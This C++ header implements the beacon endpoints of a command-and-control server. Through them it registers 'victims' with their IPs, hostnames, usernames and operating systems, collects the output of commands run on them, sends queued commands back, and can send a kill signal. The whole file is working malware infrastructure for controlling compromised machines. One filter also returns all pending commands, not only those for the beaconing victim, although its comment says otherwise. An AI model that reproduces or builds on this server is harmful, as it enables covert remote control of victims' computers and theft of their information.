#pragma once

#include "Endpoints.hpp"
#include "LogDAO.hpp"
#include <string>
#include <vector>
#include <chrono>

#include <cpppwn.hpp>

#include <CommandDAO.hpp>
#include <ResultDAO.hpp>
#include <VictimDAO.hpp>

#include <IManager.hpp>

struct CommandResult;

// Glaze metadata for beacon structures
template <>
struct glz::meta<CommandResult> {
    using T = CommandResult;
    static constexpr auto value = object(
        "command_uid", &T::command_uid,
        "result_data", &T::result_data,
        "status", &T::status
    );
};

template <>
struct glz::meta<BeaconRequest> {
    using T = BeaconRequest;
    static constexpr auto value = object(
        "victim_uid", &T::victim_uid,
        "internal_ip", &T::internal_ip,
        "external_ip", &T::external_ip,
        "hostname", &T::hostname,
        "username", &T::username,
        "operating_system", &T::operating_system,
        "command_results", &T::command_results
    );
};

template <>
struct glz::meta<BeaconResponse> {
    using T = BeaconResponse;
    static constexpr auto value = object(
        "commands", &T::commands,
        "beacon_interval", &T::beacon_interval,
        "should_exit", &T::should_exit
    );
};

//-------------------------------------------------
// Register beacon endpoint
//-------------------------------------------------
inline void register_beacon_endpoint(cpppwn::RESTServer& server) {
    auto& victims = VictimManager::instance();
    auto& commands = CommandManager::instance();
    auto& results = ResultManager::instance();
    //auto& logs = LogManager::instance();

    server.post("/api/beacon", [&](const HttpRequest& req) {
        try {
            // Parse beacon request
            BeaconRequest beacon;
            auto parse_result = glz::read_json(beacon, req.body);

            if (not parse_result) {
                return error_response(400, "Invalid beacon format");
            }

            // Update or register victim
            auto existing = victims.get_by_uid(beacon.victim_uid);

            if (existing) {
                // Update existing victim
                VictimDAO updated = *existing;
                updated.internal_ip = beacon.internal_ip;
                updated.external_ip = beacon.external_ip;
                updated.hostname = beacon.hostname;
                updated.username = beacon.username;
                updated.operating_system = beacon.operating_system;

                auto unix_timestamp = std::chrono::seconds(std::time(NULL));
                updated.last_update = std::chrono::milliseconds(unix_timestamp).count();
                updated.status = 1;  // Online

                victims.update(existing->id, updated);

                //logs.log("beacon", "Victim " + beacon.hostname + " checked in");
            } else {
                // Register new victim
                VictimDAO new_victim;
                new_victim.uid = beacon.victim_uid;
                new_victim.internal_ip = beacon.internal_ip;
                new_victim.external_ip = beacon.external_ip;
                new_victim.hostname = beacon.hostname;
                new_victim.username = beacon.username;
                new_victim.operating_system = beacon.operating_system;

                auto unix_timestamp = std::chrono::seconds(std::time(NULL));
                new_victim.last_update = std::chrono::milliseconds(unix_timestamp).count();
                new_victim.status = 1;  // Online

                victims.create(new_victim);

                //logs.log("victim_new", "New victim registered: " + beacon.hostname + " (" + beacon.external_ip + ")");
            }

            // Process command results
            for (const auto& cmd_result : beacon.command_results) {
                // Find the command
                auto cmd_opt = commands.get_by_uid(cmd_result.command_uid);

                if (cmd_opt) {
                    // Store result
                    ResultDAO result;
                    result.uid = cmd_result.command_uid;
                    result.data = cmd_result.result_data;
                    results.create(result);

                    // Update command status
                    //commands.update_status(cmd_opt->command_id, cmd_result.status);

                    //logs.log("command_result", "Command '" + cmd_opt->command + "' completed with status " + std::to_string(cmd_result.status));
                }
            }

            // Get pending commands for this victim
            auto pending_commands = commands.find([&](const CommandDAO& cmd) {
                return cmd.status == 0;  // 0 = pending
            });

            // Build beacon response
            BeaconResponse response;
            response.commands = pending_commands;
            response.beacon_interval = 60;  // 60 seconds default
            response.should_exit = false;   // Kill switch

            // Check if victim should be killed
            auto victim = victims.get_by_uid(beacon.victim_uid);
            if (victim && victim->status == 2) {  // 2 = should_exit
                response.should_exit = true;
                //logs.log("victim_killed", "Kill signal sent to " + beacon.hostname);
            }

            // Adjust beacon interval based on command count
            if (pending_commands.size() > 5) {
                response.beacon_interval = 10;  // More frequent if many commands
            } else if (pending_commands.empty()) {
                response.beacon_interval = 120;  // Less frequent if idle
            }

            std::string response_json = glz::write_json(response).value_or("{}");
            return HttpResponse().set_json(response_json);

        } catch (const std::exception& e) {
            //logs.log("beacon_error", std::string("Beacon error: ") + e.what());
            return error_response(500, std::string("Internal error: ") + e.what());
        }
    });
}

//-------------------------------------------------
// Helper: Get commands for specific victim
//-------------------------------------------------
inline void register_victim_commands_endpoint(cpppwn::RESTServer& server) {
    auto& commands = CommandManager::instance();

    server.get("/api/victim/commands", [&](const HttpRequest& req) {
        auto victim_uid_opt = req.query_params.find("victim_uid");

        if (victim_uid_opt == req.query_params.end()) {
            return error_response(400, "Missing victim_uid parameter");
        }

        std::string victim_uid = victim_uid_opt->second;

        // Get pending commands for this victim
        auto pending_commands = commands.find([&](const CommandDAO& cmd) {
            return cmd.client == victim_uid && cmd.status == 0;  // All pending commands
        });

        std::string json = to_json_array(pending_commands);
        return HttpResponse().set_json(json);
    });
}

//-------------------------------------------------
// Register all beacon-related endpoints
//-------------------------------------------------
inline void register_all_beacon_endpoints(cpppwn::RESTServer& server) {
    register_beacon_endpoint(server);
    register_victim_commands_endpoint(server);
}